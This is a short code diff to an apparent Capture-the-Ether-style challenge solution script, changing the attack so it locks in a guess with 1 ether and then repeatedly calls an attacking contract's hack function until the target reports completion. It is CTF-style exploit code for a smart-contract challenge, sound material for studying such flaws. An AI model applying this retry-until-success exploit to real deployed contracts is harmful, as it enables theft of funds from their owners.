@@ -31,7 +31,13 @@ def hack(contract_address=None, attacker=None):
 
     attacking_contract = Attack.deploy(target.address, {"from": attacker})
 
-    attacking_contract.pwn({"from": attacker, "value": "1 ether"}).wait(1)
+    attacking_contract.lockInGuess({"from": attacker, "value": "1 ether"}).wait(1)
+
+    while not target.isComplete():
+        try:
+            attacking_contract.hack({"from": attacker, "allow_revert": True}).wait(1)
+        except:
+            pass
 
     print_colour(target.isComplete())
 
